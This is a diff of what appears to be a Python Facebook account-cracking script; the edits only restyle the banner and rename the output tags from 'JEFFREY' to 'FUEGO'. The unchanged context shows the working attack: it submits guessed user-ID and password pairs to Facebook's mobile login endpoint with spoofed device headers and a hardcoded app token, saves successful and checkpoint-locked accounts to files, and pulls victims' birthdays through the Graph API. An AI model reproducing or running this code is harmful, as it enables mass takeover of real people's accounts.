@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by JEFFREY NKADIMENG
+# author by Jeffrey Nkadimeng
 import os
 try:
 	import requests
@@ -53,13 +53,12 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("\nJ E F F R E Y -- N K A D I M E N G.")
-    
-    print("➤ Author   : Jeffrey-Nkadimeng")
-    print("➤ Github   : https://github.com/Manabeng")
-    print("➤ Whatsapp : +27737093460")
-    print("➤ Facebook : Jeffrey Nkadimeng")
-
+	print("""\033[1;97m  J E F F R E Y -- M A N A B E N G .N K A D I M E N G. \033[1;0m
+\033[1;97m--------------------------------------------------
+\033[1;93m➤\033[1;97m Author   : Jeffrey Nkadimeng
+\033[1;93m➤\033[1;97m Github   : https://github.com/Manabeng
+\033[1;93m➤\033[1;97m Whatsapp : +27737093460
+\033[1;97m--------------------------------------------------""")
 def login():
 	os.system("clear")
 	try:
@@ -268,7 +267,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;91m[JEFFREY-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			print("\r\033[0;91m[FUEGO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -302,13 +301,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[0;92m[JEFFREY-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;91m[JEFFREY-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
